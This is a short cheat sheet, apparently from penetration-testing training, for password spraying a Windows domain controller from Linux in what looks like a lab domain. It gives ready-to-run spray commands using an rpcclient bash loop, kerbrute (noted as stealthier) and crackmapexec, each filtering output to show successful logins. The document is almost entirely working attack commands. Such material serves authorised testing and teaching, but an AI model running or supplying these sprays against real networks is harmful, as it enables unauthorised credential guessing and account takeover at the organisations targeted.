
## **Internal Password Spraying from a Linux Host**

### **Using a Bash one-liner for the Attack**

```bash
# Tries password "Welcome1" against all users in users.txt
# "Authority" in response = successful login
for u in $(cat users.txt); do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```

This command will try to authenticate to the domain controller with each username in the users.txt file and the password `Welcome1`. If the authentication is successful (which is indicated by the keyword `Authority` in the respond), the user's username will be returned.

### KERBRUTE PASSWORD SPRAY
```bash
# Password spray using Kerberos (stealthier than SMB)
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 users.txt Welcome1
```


### CRACKMAPEXEC PASSWORD SPRAY
```bash
# Tries Password123 against all users, shows only successful (+)
crackmapexec smb 172.16.5.5 -u users.txt -p Password123 | grep +
```